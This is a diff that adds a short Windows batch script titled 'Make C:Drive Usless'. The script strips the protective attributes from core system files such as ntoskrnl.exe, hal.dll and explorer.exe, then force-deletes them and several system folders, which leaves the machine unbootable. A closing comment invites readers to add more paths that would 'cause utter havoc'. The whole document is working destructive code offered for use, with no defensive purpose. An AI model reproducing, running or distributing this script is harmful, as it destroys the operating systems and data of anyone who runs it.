@@ -1,0 +1,25 @@
+Make C:Drive Usless:
+
+
+Attrib -r -s -h C:\Windows\PCHEALTH\
+Attrib -r -s -h C:\Windows\explorer.exe
+Attrib -r -s -h C:\Windows\system\
+Attrib -r -s -h C:\Windows\system32\ntoskrnl.exe
+Attrib -r -s -h C:\Windows\system32\hal.dll
+del /F /S /Q C:\Windows\PCHEALTH\
+del /F /S /Q C:\Windows\explorer.exe
+del /F /S /Q C:\Windows\system\
+del /F /S /Q C:\Windows\system32\ntoskrnl.exe
+del /F /S /Q C:\Windows\system32\hal.dll
+ERASE /F /S /Q C:\Windows\PCHEALTH\
+ERASE /F /S /Q C:\Windows\explorer.exe
+ERASE /F /S /Q C:\Windows\system\
+ERASE /F /S /Q C:\Windows\system32\ntoskrnl.exe
+ERASE /F /S /Q C:\Windows\system32\hal.dll
+
+
+
+Feel free to add any path of a 
+file that look promissing to cause
+utter havoc if it were deleted or 
+its attributes were removed.
